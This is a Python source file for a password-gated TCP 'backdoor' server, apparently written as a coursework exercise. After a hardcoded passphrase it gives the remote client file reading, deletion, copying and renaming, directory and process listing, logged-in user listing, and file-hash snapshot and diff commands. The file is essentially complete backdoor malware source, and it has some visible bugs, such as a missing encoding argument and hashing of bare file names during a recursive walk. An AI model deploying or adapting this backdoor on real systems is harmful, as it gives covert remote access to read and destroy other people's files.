import hashlib
import shutil
import signal
import os
import sys
import socketserver
import subprocess
import socket, threading


class MyTCPHandler(socketserver.BaseRequestHandler):
   BUFFER_SIZE = 4096
   fileNameList = []
   fileHashList = []
   fileNameListDiff = []
   fileHashListDiff = []
   def handle(self):
       authorization = False
       self.request.sendall(bytearray("Identify yourself!\n","utf-8"))
       while 1:
           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break
           if len(data) == 0:
               break
           data = data.decode( "utf-8")
           print(data.strip())
           word = data.split() #make it easier to manage
           if data[:-1] == "pass miningRig" and not authorization: #check if the user is authorize or not if yes execute available command
            self.request.sendall(bytearray("welcome boss\n","utf-8"))
            authorization = True
           if authorization == True:
               if (word[0] == "pwd"):
                   self.request.sendall(bytearray(os.getcwd() + "\n", "utf-8"))
               elif (word[0] == "ls"):
                   process = subprocess.Popen(['ls', '-l', '-a', os.getcwd()], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
                   self.request.sendall(process.stdout.read())

               elif (word[0] == "cd"):
                   try:
                       os.chdir(word[1])
                       self.request.sendall(bytearray("ok\n", "utf-8"))
                   except Exception as e:
                       self.request.sendall(bytearray(str(e) + "\n", "utf-8"))	  
               elif (word[0] == "cp"):
                   shutil.copyfile(word[1],word[2])
               elif (word[0] == "mv"):
                   os.rename(word[1],word[2])
               elif (word[0] == "rm"):
                   os.remove(word[1])
               elif (word[0] == "cat"):
                   try:
                       f = open(word[1], 'rb')
                       self.request.sendall(f.read())
                       self.request.sendall(bytearray("\n", "utf-8"))
                       f.close()
                   except Exception as e:
                       self.request.sendall(bytearray(str(e) + "\n" + "utf-8"))
               elif (word[0] == "help"):
                   try: #print more detailed help for the command
                       if (word[1] == "pwd"):
                           self.request.sendall(bytearray("return the current working directory\n", "utf-8"))
                       if (word[1] == "cd"):
                           self.request.sendall(bytearray("change the current working directory to <dir>\n", "utf-8"))
                       if (word[1] == "ls"):
                           self.request.sendall(bytearray("list the contents of the current working directory\n", "utf-8"))
                       if (word[1] == "cp"):
                           self.request.sendall(bytearray("copy file1 to file2\n", "utf-8"))
                       if (word[1] == "mv"):
                           self.request.sendall(bytearray("rename file1 to file2\n", "utf-8"))
                       if (word[1] == "rm"):
                           self.request.sendall(bytearray("delete file\n", "utf-8"))
                       if (word[1] == "cat"):
                           self.request.sendall(bytearray("return contents of the file\n", "utf-8"))
                       if (word[1] == "snap"):
                           self.request.sendall(bytearray("take a snapshot of all the files in the current directory and save it in memory\nthe snapshot should only include the filenames and hashes of the files\nthe snapshot should survive client disconnecting and reconnecting later\n", "utf-8"))                       
                       if (word[1] == "diff"):
                           self.request.sendall(bytearray("compare the contents of the current directory to the saved snapshot, and report\ndifferences(deleted files, new files and changed files)\nthesnapshot should survive client disconnecting and reconnecting later\n", "utf-8"))
                       if (word[1] == "help"):
                           self.request.sendall(bytearray("print a list of commands, and if given an argument, print more detailed help for\nthe command\n", "utf-8"))
                       if (word[1] == "logout"):
                           self.request.sendall(bytearray("disconnect client (server closes the socket)\n", "utf-8"))
                       if (word[1] == "off"):
                           self.request.sendall(bytearray("terminate the backdoor program\n", "utf-8"))
                       if (word[1] == "who"):
                           self.request.sendall(bytearray("list user[s] currently logged in\n", "utf-8"))
                       if (word[1] == "ps"):
                           self.request.sendall(bytearray("show currently running processes\n", "utf-8"))
                   except IndexError:
                       self.request.sendall(bytearray("supported commands:\n" + "pwd, cd, ls, cp, mv, rm, cat,snap, diff, help, logout,off, ps, who\n" ,"utf-8"))
               elif (word[0] == "who"):
                   self.request.sendall(bytearray( os.popen('who').read(),"utf-8") ) 
               elif (word[0] == "ps"):
                   pl = subprocess.Popen(['ps', '-e'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
                   self.request.sendall(pl.stdout.read() ) 
               elif (word[0] == "off"):
                   self.request.sendall(bytearray("I am terminating myself. So long...\n", "utf-8"))
                   os.kill(os.getpid(),signal.SIGHUP)
               elif (word[0] == "logout"):
                   self.request.sendall(bytearray("logging out\n","utf-8"))
                   self.request.shutdown(1)
                   self.request.close()
                   break
               elif (word[0] == "snap"):
                   dir = os.getcwd()
                   for dirName, subdirList, fileList in os.walk(dir):
                       for fname in fileList:
                           sha1 = hashlib.sha1()
                           with open(fname, 'rb') as afile:
                               buf = afile.read(65536)
                               while len(buf) > 0:
                                   sha1.update(buf)
                                   buf = afile.read(65536)
                           #print("FileName ", fname, hasher.hexdigest())
                           self.fileNameList.append(fname)
                           self.fileHashList.append(fname + "-" + sha1.hexdigest())
                   self.request.sendall(bytearray("OK\n","utf-8"))
                   print ("File Name ", self.fileNameList, "Hash ", self.fileHashList)
                           #print('\t%s' % fname)
               elif (word[0] == "diff"):
                   image = True 
                   #testing if snapshot exist or not
                   if not self.fileNameList:
                       self.request.sendall(bytearray("ERROR: no snapshot\n", "utf-8"))
                       image = False
                   dir = os.getcwd()
                   #Find deleted files
                   for dirName, subdirList, fileList in os.walk(dir):
                       for fname in fileList:
                           self.fileNameListDiff.append(fname)
                   for val in self.fileNameList:
                       if val not in self.fileNameListDiff and image == True:
                           self.request.sendall(bytearray(val + " - was deleted\n","utf-8"))
                   #Find added files
                   for val in self.fileNameListDiff:
                       if val not in self.fileNameList and image == True:
                           self.request.sendall(bytearray(val + " - was added\n","utf-8"))
                  #Find change files
                   
                   for index in range(len(self.fileNameListDiff)):
                       sha1 = hashlib.sha1()
                       if self.fileNameListDiff[index] in self.fileNameList: #check for file
                           print("the file exists " + self.fileNameListDiff[index] +"\n")
                           #checksum
                           sha1 = hashlib.sha1()
                           with open(self.fileNameListDiff[index], 'rb') as afile:
                               print("self.fileNameListDiff[index] in with " + self.fileNameListDiff[index] +"\n")
                               print("the index is ", index, "\n")
                               buf = afile.read(65536)
                               while len(buf) > 0:
                                   sha1.update(buf)
                                   buf = afile.read(65536)
                           #print("checksum " + sha1.hexdigest() +"\n")
                           checking = self.fileNameListDiff[index] + "-" + sha1.hexdigest()
                           print (checking +"\n")
                           if (checking not in self.fileHashList and image == True):
                               self.request.sendall(bytearray(self.fileNameListDiff[index] + " - was changed\n","utf-8"))

if __name__ == "__main__":
   HOST, PORT = "localhost", int(sys.argv[1])
   server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
   server.serve_forever()
